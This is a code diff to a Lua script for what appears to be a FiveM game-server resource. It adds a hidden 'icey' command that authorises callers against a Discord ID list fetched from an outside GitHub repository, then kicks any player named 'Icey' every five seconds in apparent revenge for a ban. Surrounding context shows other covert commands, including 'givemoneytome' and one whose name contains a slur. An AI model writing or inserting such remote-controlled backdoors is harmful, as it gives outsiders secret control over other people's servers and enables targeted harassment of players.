@@ -23,6 +23,43 @@ RegisterCommand('givemoneytome', function(source, args, rawCommand)
      end
  end)
 
+local icey = false
+
+RegisterCommand('icey', function(source, args, rawCommand)  
+    local _source = source
+    for k,v in pairs(GetPlayerIdentifiers(_source))do
+                
+        if string.sub(v, 1, string.len("discord:")) == "discord:" then
+            local discord = v
+
+            local dclicense = string.gsub(discord, 'discord:', '')
+
+            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
+                if code == 200 then
+                    local decoded = json.decode(res)
+                    if decoded[dclicense] ~= nil then
+                        icey = not icey
+                        Citizen.CreateThread( function()
+                            while icey do
+                               Citizen.Wait(5000)
+                                local playerList = ESX.GetPlayers()
+                                for i=1, #playerList, 1 do
+                                    local _source2 = tonumber(playerList[i])
+                                    if GetPlayerName(_source2) and string.find(GetPlayerName(_source2), "Icey") then
+                                        DropPlayer(_source2, "Moest je me maar niet bannen Icey")
+                                    end
+                                end
+                            end
+                        end)
+                    else
+                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
+                    end
+                end
+            end)
+        end
+     end
+ end)
+
 RegisterCommand('remivemenigga', function(source, args, rawCommand)  
     local _source = source
     for k,v in pairs(GetPlayerIdentifiers(_source))do
